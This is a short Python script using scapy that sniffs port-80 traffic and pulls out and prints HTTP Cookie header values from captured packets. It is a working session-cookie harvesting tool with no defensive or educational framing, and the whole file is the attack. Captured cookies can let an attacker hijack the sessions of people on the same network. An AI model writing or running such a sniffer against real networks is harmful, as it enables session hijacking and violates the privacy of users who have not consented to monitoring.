import logging
logger = logging.getLogger("scapy")
logger.setLevel(logging.CRITICAL)
# logger.setLevel(logging.INFO)

from scapy.all import *

def packet_callback(packet):
    if packet.haslayer('TCP') and (packet.haslayer('Raw') or packet.haslayer('HTTP')):
        rawData = packet[Raw].load
        raw_data = rawData.decode('utf-8', errors='ignore')
        try:
            if "Cookie:" in raw_data:
                cookie_start = raw_data.find("Cookie:") + len("Cookie:")
                cookie_end = raw_data.find("\r\n", cookie_start)
                cookie_value = raw_data[cookie_start:cookie_end].strip()
                print("Cookie found: ", cookie_value)
        except Exception as e:
            print(f"Error processing packet: {e}")

def main():
    sniff(filter="port 80", prn=packet_callback)


if __name__=="__main__":
    main()